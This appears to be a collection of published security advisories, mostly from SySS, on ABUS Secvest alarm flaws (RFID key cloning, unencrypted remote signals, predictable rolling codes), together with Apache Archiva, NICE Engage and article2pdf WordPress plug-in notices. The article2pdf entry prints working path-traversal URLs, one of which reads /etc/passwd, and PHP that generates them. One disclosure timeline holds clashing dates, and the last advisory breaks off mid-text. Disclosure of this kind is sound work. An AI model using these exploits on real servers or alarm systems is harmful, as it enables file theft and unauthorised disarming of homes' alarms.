SySS GmbH found out that the RFID technology used by the ABUS Secvest
wireless alarm system and its ABUS proximity keys (MIFARE Classic RFID
tags) is vulnerable to RFID cloning attacks.
The information stored on the used proximity keys can be read easily in
a very short time from distances up to 1 meter, depending on the used
RFID reader. A working cloned RFID token is ready for use within a
couple of seconds using freely available tools.
Thus, an attacker with one-time access to the information of an ABUS
proximity key for an ABUS Secvest wireless alarm system is able to
create a rogue RFID token that can be used to deactivate the alarm
system in an unauthorized manner.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully clone ABUS proximity keys of an ABUS
Secvest wireless alarm system using different freely available
off-the-shelf tools like an Android smartphone with the Mifare Classic
Tool (MCT) [3], a ChameleonMini [4], and an RFID/NFC reader/writer [5]
and disarm the wireless alarm system in an unauthorized way.
All three RFID cloning attacks are demonstrated in our SySS
proof-of-concept video ""ABUS Secvest Proximity Key Cloning PoC Attack""
[6].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-03-15: Vulnerability reported to manufacturer
2016-05-02: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for ABUS Secvest wireless alarm system
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Alarm-panels-and-kits/Secvest-Wireless-Alarm-System
[2] Product website for ABUS proximity chip key
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Control-devices-and-extensions/Proximity-Chip-Key
[3] MIFARE Classic Tool - MCT
https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool
[4] GitHub repository of ChameleonMini
https://github.com/emsec/ChameleonMini
[5] OBO Hands RFID/NFC Reader/Writer
https://www.amazon.de/dp/B07DHL9XQ4/
[6] SySS Proof-of-Concept Video: ABUS Secvest Proximity Key Cloning PoC Attack
https://youtu.be/sPyXTQXTEcQ
[7] SySS Security Advisory SYSS-2019-005
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-005.txt
[8] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg and Gerhard
Klostermeier of SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlzKsdkACgkQ2aS/ajSt
TaujyQ/9FASdsNHxRgsOvBhw0V4+VPsVDprGjA4h39bhDJ8f4XIcAzz6ZUiXnR+0
2/0N7MkbFV4gjAmq6TVLQjw6bAlLVRHpLaWsWWQQGjDedynljMlls+bBNsIDLmfz
9mBl8S2lp26jycLgtPgL0hdjzBok9Gf6UZt5H2AnXkfDwthjqR7Ln+x4t3potLJt
d87l4Xe/C1x1aMmiJWRy3CxzGTDtCoD/CwBTGvTCTPHnF/9gRobHPLIho6RKzwRE
WUtTKQ9me19E5NYX7lPgF3UUcMxVP3f5Yf32K6XnuByEbk0LHiJzKxXNdMT/MCP4
jWAVkWtXHshWb17aGBCbcI1zt9DJEis6dPgm2PJ+qVE/C4s4EszDe/Hc7wgH3fU9
iXY/+SHhgBml55WyNssH+u6TBiIr20/YyABcPQmzCP97sPWzBxMrUlzaad88dsGO
I6O9TlcveBrKDcyj8+frv/c+7BU95ZOZmUDLZJ99/KXF1APRGG6JaIQsJm1pi36W
O4gUFgUSZ+SiELf/ZsFP3dgPaHMG/pyEVH6mYQKVrm8hEYL/Iyi9WYk4G9TztGN2
g7fkpTI4cTcPYkj9uPBMc5RWCPKCRflkG8QAxf92FBA1rNF3oJYEXQH2RQuvzYqB
ghpsBL30GyEjh2DFo/sUzMPUt1Wl1otw3CzEH4eVqIX5J620ol4=
=km71
-----END PGP SIGNATURE-----"
495,[SECURITY] CVE-2019-0214: Apache Archiva arbitrary file write and delete on the server,,CVE-2019-0214,"CVE-2019-0214: Apache Archiva arbitrary file write and delete on the server
Severity: Medium
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Archiva 2.0.0 - 2.2.3
The unsupported versions 1.x are also affected.
It is possible to write files to the archiva server at arbitrary locations by using the artifact upload mechanism.
Existing files can be overwritten, if the archiva run user has appropriate permission on the filesystem for the target file.
Mitigation:
It is highly recommended to upgrade to Archiva 2.2.4 or higher, where additional validations are implemented to prevent such malicious parameter values.
As intermediate action you may reduce the number of users that are allowed to upload to archiva and make sure, that the archiva run user may have only
write permission to the directories needed.
References:
http://archiva.apache.org/security.html#CVE-2019-0214
The newest Archiva version can be downloaded from:
http://archiva.apache.org/download.cgi"
496,[SECURITY] CVE-2019-0213: Apache Archiva Stored XSS,,CVE-2019-0213,"CVE-2019-0213: Apache Archiva Stored XSS
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Archiva 2.0.0 - 2.2.3
The unsupported versions 1.x are also affected.
It may be possible to store malicious XSS code into central configuration entries, i.e. the logo URL.
The vulnerability is considered as minor risk, as only users with admin role can change the configuration, or the communication
between the browser and the Archiva server must be compromised.
Mitigation:
All users are recommended to upgrade to Archiva 2.2.4 or higher,
References:
http://archiva.apache.org/security.html#CVE-2019-0213
The newest Archiva version can be downloaded from:
http://archiva.apache.org/download.cgi"
514,CVE-2018-2879 - anniversary,,CVE-2018-2879,"For the anniversary of the discovery of CVE-2018-2879 by Sec Consult (https://sec-consult.com/en/blog/2018/05/oracle-access-managers-identity-crisis/) we have decided to release OAMbuster, a multi-thread implementation of CVE-2018-2879.
Link of the exploit: https://github.com/redtimmy/OAMBuster
Some additional details: https://redtimmysec.wordpress.com/2019/04/14/oambuster-multithreaded-exploit-for-cve-2018-2879/
regards
Red Timmy Security"
538,CVE-2019-7727 - JMX/RMI Nice ENGAGE <= 6.5 Remote Command Execution,,CVE-2019-7727,"Description
===========
NICE Engage is an interaction recording platform. The default configuration in versions <= 6.5 (and possible higher) binds an unauthenticated JMX/RMI interface to all network interfaces, without restricting registration of MBeans, which allows remote attackers to execute arbitrary code via the RMI protocol by using the JMX connector. The observed affected TCP port is 6338 but based on product's configuration a different one could be vulnerable.
More details visiting: https://redtimmysec.wordpress.com/2019/03/26/jmx-rmi-multiple-applications-rce/"
550,"[article2pdf (Wordpress plug-in)] Multiple vulnerabilities (CVE-2019-1000031, CVE-2019-1010257)",,CVE-2019-1000031,"Product: article2pdf (Wordpress plug-in)
Product Website: https://wordpress.org/plugins/article2pdf/
Affected Versions: 0.24 and greater
The following vulnerabilities were found in a code review of the plug-in. An attempt to contact the
plug-in maintainer on 8 December 2018 was unsuccessful. The Wordpress security team disabled downloads
of the plug-in upon notification on 8 January 2019.
I would like to thank Ken Johnson (@cktricky) and Set Law (@sethlaw) whose course
""Seth & Ken's Excellent Adventures in Secure Code Review"" sparked my interest in reviewing code for
vulnerabilities.
[CVE-2019-1000031] Generated PDF file is only removed after download which is initiated by a redirect
=====================================================================================================
Type:
-----
Resource Exhaustion
Description:
-----------
The plugin generates a PDF version of a post/article when a link of the
form
https://www.example.com/.../my-post-title/?article2pdf=1
is visited. The response to this initial request is a redirect to a link
like
http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=xxx&r=yyy&d=zzz
which will then return the PDF file contents and subsequently delete
the file.
As the deletion is coupled with the download but the download is
initiated by a different request than the one which creates the file,
visiting the link which creates the file and not following the redirect
results in the file not being deleted. These files can then accumulate
and potentially exhaust the available disk space.
Depending on the server setup, space exhaustion of a hard drive or hard
drive partition or even just a disk quota can result in denial of
service even for unrelated services on the same machine which rely on
the same resource.
This issue was originally reported on the plugin's bug tracker [2] but
never identified as a vulnerability.
Exploit
-------
Repeatedly visit a PDF generation link the plugin provides without ever
following the redirect to exhaust disk space.
[CVE-2019-1010257] PDF file download path is constructed from insufficiently sanitised user input
=================================================================================================
Type:
-----
Information Disclosure / File Deletion
Description:
------------
When visiting the PDF download link which the original PDF generation
link redirects to, the file path is constructed from a combination of
fixed strings and the strings provided via the query string of the
download URL. The download URL has the form
http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=xxx&r=yyy&d=zzz
where xxx is a base64 encoded absolute string, xxx is a short hex hash
and zzz is the base64 encoded URL title slug of the post the PDF was
generated from. While the plugin attempts to sanitise these input
parameters to not allow path traversal, this sanitisation is
insufficient and can be fully or partially circumvented depending on
the PHP version the Wordpress instance is running on.
In the case of PHP version <5.3 it is possible to read any file the
user the plugin is executed under has read access to by just encoding
the full file path in the parameter ""d"" and terminating that string
with a null-byte. The parameter ""p"" must not be empty but can contain
any value. The parameter ""r"" may be empty but its value is of no
significance. If the user that the script is executed as has write
access to the file or the directory it is stored in, the file will be
deleted after it has been downloaded. If the user has no write access,
an error message may be shown at the end of the file contents
offered which discloses the Wordpress instance's install directory on
the server.
In the case of PHP version >=5.3, null-termination will no longer cut
off the string. As the generated file name ends with a fixed string
"".pdf"", only files with that file ending can be read. The parameter ""d""
may be any directory on the server. The parameter ""p"" needs to contain
8 backspace characters to delete a prepended fixed string from the file
name while the parameter ""r"" must contain exactly one backspace. The
actual file name (without the "".pdf"") can then be appended to the
backspaces in either parameter ""p"" or parameter ""r"". It is also
possible to have ""p"" contain one random character and then have 10
backspace characters followed by the actual file name (again,
without the "".pdf"") stored in parameter ""r"".
The information above can also be found on the plug-in's issue tracker [3].
Exploit:
--------
On PHP <5.3, a specially crafted link like
http://php52.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=YQ==&r=&d=L2V0Yy9wYXNzd2QA
will download the server's /etc/passwd file.
On PHP >=5.3, a specially crafted link like
http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=CAgICAgICAg=&r=%08test&d=L3RtcA==
will return the contents of the file ""/tmp/test.pdf"" and delete the
file if the user the script is executed as has permissions to do so.
The link used above can be generated using a few lines of PHP:
<?php
$d52 = base64_encode(""/etc/passwd"");
$p52 = base64_encode(""a"");
$r52 = """";
echo ""http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=${p52}&r=${r52}&d=${d52} "";
$d53 = base64_encode(""/tmp"");
$p53_raw = """";
for ($i=0;$i<8; $i++) $p53_raw .= chr(8);
$p53 = base64_encode($p53_raw);
$r53 = ""%08test"";
echo ""http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=${p53}&r=${r53}&d=${d53} "";
[1] https://wordpress.org/plugins/article2pdf/
[2] https://wordpress.org/support/topic/plugin-article2pdf-temporary-files-filling-up-server-space/
[3] https://wordpress.org/support/topic/pdf-download-path-improperly-sanitised/"
560,[SYSS-2018-036]: ABUS Secvest Remote Control - Denial of Service - Uncontrolled Resource Consumption (CWE-400),CWE-400,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2018-036
Product: ABUS Secvest Remote Control (FUBE50014, FUBE50015)
Manufacturer: ABUS
Affected Version(s): n/a
Tested Version(s): n/a
Vulnerability Type: Denial of Service - Uncontrolled Resource Consumption (CWE-400)
Risk Level: Low
Solution Status: Open
Manufacturer Notification: 2018-11-21
Solution Date: -
Public Disclosure: 2019-03-25
CVE Reference: CVE-2019-9860
Authors of Advisory: Matthias Deeg (SySS GmbH), Thomas Detert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ABUS Secvest FUBE50014 and FUBE50015 are wireless remote controls for
the ABUS Secvest wireless alarm system.
Some of the device features as described by the manufacturer are
(see [1]):
""
* User-friendly remote control with easily identifiable symbols
* Features �arm�, �disarm� and �status query� keys
* 8 LEDs provide an overview and display current system status
* Button for custom configuration available (Secvest wireless alarm
system only)
* Optional manual panic alarm available (Secvest wireless alarm system
only)
* Encrypted signal transmission
* Rolling Code
Thanks to the rolling code process this product is protected against
so-called replay attacks. All controlling signals between this product
and the Secvest alarm panel are in individualised and thus, are not
able to be reproduced by third parties. This process is protected
from third party tampering, and exceeds the requirements of the
DIN EN 50131-1 level 2 security standard.
""
Due to unencrypted signal communication and predictability of rolling
codes, an attacker can ""desynchronize"" an ABUS Secvest wireless remote
control regarding its controlled Secvest wireless alarm system, so that
sent commands by the remote control are not accepted anymore.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Thomas Detert found out that the claimed ""Encrypted signal transmission""
of the Secvest wireless remote control FUBE50014 is not present (see
SySS security advisory SYSS-2018-035 [2]) and that the implemented
rolling codes are predictable (see SySS security advisory SYSS-2018-034
[3]).
By exploiting these two security issues, an attacker can simply
desynchronize a wireless remote control by observing the current rolling
code state, generating many valid rolling codes, and use them before the
original wireless remote control.
The Secvest wireless alarm system will ignore sent commands by the
wireless remote control until the generated rolling code happens to
match the window of valid rolling code values again. Depending on the
number of used rolling codes by the attacker, a resynchronization
without actually reconfiguring the wireless remote control could take
quite a lot of time and effectless button presses.
SySS found out that the new ABUS Secvest remote control FUBE50015 is
also affected by this security vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Thomas Detert developed a Teensy-based PoC tool using a CC1101 sub-1GHz
transceiver that allows disarming the alarm system in an unauthorized
way. He provided his tool including documentation and source to SySS
GmbH for responsible disclosure purposes.
Based on Mr. Detert's PoC tool, SySS GmbH developed a Python tool for
the RFCat-based radio dongle YARD Stick One (see [4]) for demonstrating
this simple denial-of-service (DoS) attack against the ABUS Secvest
wireless remote controls FUBE50014 and FUBE50015. This tool simply
generates many valid rolling codes based on the current observed state
and uses them resulting in desynchronizing the original wireless remote
control.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-11-21: Vulnerability reported to manufacturer
2018-11-28: Vulnerability reported to manufacturer once more
2018-12-12: E-mail to ABUS support asking if they are going to give
some feedback regarding the reported security issue
2018-12-12: Phone call with ABUS support, the reported security
advisories were forwarded to the ABUS Security Center
Support
2018-12-12: E-mail to ABUS Security Center Support asking if they are
going to give some feedback regarding the reported security
issue
2019-01-14: Updated information regarding remote control ABUS Secvest
FUBE50015
2019-03-25: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for ABUS Secvest wireless remote control
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Control-devices-and-extensions/Secvest-Wireless-Remote-Control2
[2] SySS Security Advisory SYSS-2018-035
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-035.txt
[3] SySS Security Advisory SYSS-2018-034
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-034.txt
[4] Product website YARD Stick One
https://greatscottgadgets.com/yardstickone/
[5] SySS Security Advisory SYSS-2018-036
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-036.txt
[6] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Thomas Detert.
Mr. Detert reported his finding to SySS GmbH where it was verified and
later reported to the manufacturer by Matthias Deeg.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlyUoMMACgkQ2aS/ajSt
TatXPw/8CKe79eTckW/tXs4iIXP3hRTwy3+doB5r92txbd5OkayGRvfY6nGLX+LB
naael/ZimlLq6QfNZsMiFli1+L9PS3IB52Suo2w7thHcTvz+fPJVfMt0fTkeGTvX
mTfm8/ZsQ1vH0uU2EccwL5aVatiVHzuowJd6yv9afWBQ+ci8fShFmm7FGgfeCWoP
Z3iOfttXlpPNMUsk9gMum+UeyqBsGSj0KjJxy3Cuugz783IPB+hdDWLPigmdtZPO
chO7jEC6JXQJXt5UK/F8CdSZ1xF1NhfpQ9NvzvIBeEMy7V19S3EUnsow88i8HOSL
pkRtISvp98QHfomJMCUUXRe6DSnXFyVy416zgw753610vCvlVH9pgKZ2JlyHragA
YKSbadah2qqmYOm6Z7NMuXVNA+TqNh70u14IOl1bdr+Gp1nbvdcORMdU0aoBZfO+
KdyVBbeZgOQ9jOFs8dZzzMCuCx3eMsby4Ynwwnuu/YS4j1fwaK6l+G+nOEHLzc+J
U2txKilfISr3kupFj/UBYzd7AjHul7C7Uu8LzI/HcAWSlv/zwtc0PiluAjFV1C7x
pyaICS9AISt4YzNXUyH/bm2NkehxXz6lMnvJ4j8jvJJbdbvlgyhnKXovZMzRlN8Y
0WLRQtlTx/zYjZyD+qw5/L53qx3An0OYBVLLYFduU9FgZbgnbnM=
=Zb9J
-----END PGP SIGNATURE-----"
561,[SYSS-2018-035]: ABUS Secvest Remote Control - Missing Encryption of Sensitive Data (CWE-311),CWE-311,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2018-035
Product: ABUS Secvest Remote Control (FUBE50014, FUBE50015)
Manufacturer: ABUS
Affected Version(s): n/a
Tested Version(s): n/a
Vulnerability Type: Missing Encryption of Sensitive Data (CWE-311)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2018-11-21
Solution Date: -
Public Disclosure: 2019-03-25
CVE Reference: CVE-2019-9862
Authors of Advisory: Matthias Deeg (SySS GmbH), Thomas Detert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ABUS Secvest FUBE50014 and FUBE50015 are wireless remote controls for
the ABUS Secvest wireless alarm system.
Some of the device features as described by the manufacturer are
(see [1]):
""
* User-friendly remote control with easily identifiable symbols
* Features �arm�, �disarm� and �status query� keys
* 8 LEDs provide an overview and display current system status
* Button for custom configuration available (Secvest wireless alarm
system only)
* Optional manual panic alarm available (Secvest wireless alarm system
only)
* Encrypted signal transmission
* Rolling Code
Thanks to the rolling code process this product is protected against
so-called replay attacks. All controlling signals between this product
and the Secvest alarm panel are in individualised and thus, are not
able to be reproduced by third parties. This process is protected
from third party tampering, and exceeds the requirements of the
DIN EN 50131-1 level 2 security standard.
""
Due to the missing ""Encrypted signal transmission"", an attacker is able
to eavesdrop sensitive data as cleartext, for instance the current
rolling code state.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Thomas Detert found out that the claimed ""Encrypted signal transmission""
of the Secvest wireless remote control FUBE50014 is not present at all.
Thus, an attacker observing radio signals of an ABUS FUBE50014
wireless remote control is able to see all sensitive data of
transmitted packets as cleartext and can analyze the used packet format
and the communication protocol.
For instance, this security issue could successfully be exploited to
observe the current rolling code state of the wireless remote control
and deduce the cryptographically weak used rolling code algorithm
(see SySS security advisory SYSS-2018-034 [2]).
SySS found out that the new ABUS Secvest remote control FUBE50015 is
also affected by this security vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Thomas Detert developed a Teensy-based PoC tool using a CC1101 sub-1GHz
transceiver that allows disarming the alarm system in an unauthorized
way. He provided his tool including documentation and source to SySS
GmbH for responsible disclosure purposes.
SySS GmbH could successfully perform a disarming attack against an ABUS
Secvest wireless alarm system by exploiting the unencrypted signal
transmission of the ABUS Secvest wireless remote controls FUBE50014 and
FUBE50015 and the predictable rolling code implementation using either
Mr. Detert's PoC tool, a developed Python tool for the RFCat-based radio
dongle YARD Stick One (see [3]), or a eZ430-Chronos (see [4]) with a
specially developed firmware.
Successful disarming attacks against an ABUS Secvest wireless alarm
system are shown in our SySS proof-of-concept video ""ABUS Secvest
Rolling Code PoC Attack"" [7].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-11-21: Vulnerability reported to manufacturer
2018-11-28: Vulnerability reported to manufacturer once more
2018-12-12: E-mail to ABUS support asking if they are going to give
some feedback regarding the reported security issue
2018-12-12: Phone call with ABUS support, the reported security
advisories were forwarded to the ABUS Security Center
Support
2018-12-12: E-mail to ABUS Security Center Support asking if they are
going to give some feedback regarding the reported security
issue
2019-01-14: Updated information regarding remote control ABUS Secvest
FUBE50015
2019-03-25: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for ABUS Secvest wireless remote control
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Control-devices-and-extensions/Secvest-Wireless-Remote-Control2
[2] SySS Security Advisory SYSS-2018-034
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-034.txt
[3] Product website YARD Stick One
https://greatscottgadgets.com/yardstickone/
[4] Product website for Texas Instruments eZ430-Chronos
http://www.ti.com/tool/EZ430-CHRONOS
[5] SySS Security Advisory SYSS-2018-035
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-035.txt
[6] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
[7] SySS Proof-of-Concept Video: ABUS Secvest Rolling Code PoC Attack
https://youtu.be/pSdsMVn-7gM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Thomas Detert.
Mr. Detert reported his finding to SySS GmbH where it was verified and
later reported to the manufacturer by Matthias Deeg.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlyUoLoACgkQ2aS/ajSt
TauU4Q/8CZRBKZPUkuVKjWkxurI4k9zH2+FRpVGlddz7Icx547VJdYUFLmGGXtQW
yH5DrxrDJTM6IjPh8l6Dw3Vrf5EwP/AN5NAKKEeWGam+SVtF4jq2xZu7O+XgL5Q7
MO2BrqMFv5v/8R8bYkWTczMcwnznMZB/9xQnFaGr4Tp//LH8VQ54UfQH/7fCgVGT
RcHMKKx05EuRD4coU1uogwdsjfXDmY+hTEl9vArV6S6dtqKa1vXv54PN07mvlZNW
CvojEpWXmkzlev4mDmS+WsjvDRKDE5AW9Dflg1pcQLH0/20eK4PAjJAlk+2qaxM0
g1t3U6O/pjotp4BxHhrYvcPjAY0iLz4S1yCVte8VdQ1zZ1LQ0+N8zMBx3sp+Sfo0
mCJuj/GBpgtS/AsBcsNiSlHgUhl6tIkhbrocJ5F8f5yx0NLWeSZ+iZPp2IxHqT/b
ZZj5xZd+WQjRnwN/Rp5Pe3Fgg/PBiCOpW4BmTiZytkm9fu23u3BDYC3daXzGgQmg
WiodnGM/TsLWryuckh5blqP/595PNbvc/zdjofWHkz9fGX29hsvkoXo3AjFBYsFw
mbtGKHPO9qod7Gp6xwLUVq4PXMP8Yhrif4/ZzHh2gzNFQ5gFH+6lUYpomwIqyw51
3knWk51fjOd1suaXGzxN87zbhqKhVh+GsopwsrG5OvbSQXhnYIA=
=5FYg
-----END PGP SIGNATURE-----"
562,[SYSS-2018-034]: ABUS Secvest - Rolling Code - Predictable from Observable State (CWE-341),CWE-341,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2018-034
Product: ABUS Secvest (FUAA50000)
Manufacturer: ABUS
Affected Version(s): v3.01.01
Tested Version(s): v3.01.01
Vulnerability Type: Rolling Code - Predictable from Observable State (CWE-341)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2018-11-21
Solution Date: -
Public Disclosure: 2019-03-25
CVE Reference: CVE-2019-9863
Authors of Advisory: Matthias Deeg (SySS GmbH), Thomas Detert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ABUS Secvest (FUAA50000) is a wireless alarm system with different
features.
Some of the supported features as described by the manufacturer are
(see [1]):
""
* Convenient operation via the app (Android/iOS), integrated web
browser and also at the alarm panel
* For up to 50 users with freely selectable control options
(code/chip key/remote control)
* Active intrusion protection in combination with additional mechatronic
wireless window/door locks
* Video verification of alarms via email, push notifications or via the
app
* Up to 48 individually identifiable wireless detectors, eight control
panels, 50 remote controls
* Integrated dialling device
* VdS Home certified and EN 50131-1 Level 2
* Alarm verification via the integration of up to six IP cameras
* 32 additional wireless outputs for flexible event control
* Switching to monitoring station via protocols possible
""
Due to the use of an insecure algorithm for rolling codes, an attacker
is able to predict valid future rolling codes and can thus remotely
control the ABUS Secvest wireless alarm system in an unauthorized way.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Thomas Detert found out that the rolling codes implemented as replay
protection (see SySS security advisory SYSS-2016-117 [2]) in the radio
communication protocol used by the ABUS Secvest wireless alarm system
(FUAA50000) and its remote control (FUBE50014, FUB50015) is
cryptographically weak. Thus, an attacker observing the unencrypted radio
signals of an ABUS FUBE50014 or FUBE50015 wireless remote control
(see SySS security advisory SYSS-2018-035 [6]) is able to deduce the
implemented rolling code algorithm and to correctly predict valid future
rolling codes.
This enables an attacker to remotely control affected wireless alarm
systems in an unauthorized manner, for instance disarming the wireless
alarm system at will.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Thomas Detert developed a Teensy-based PoC tool using a CC1101 sub-1GHz
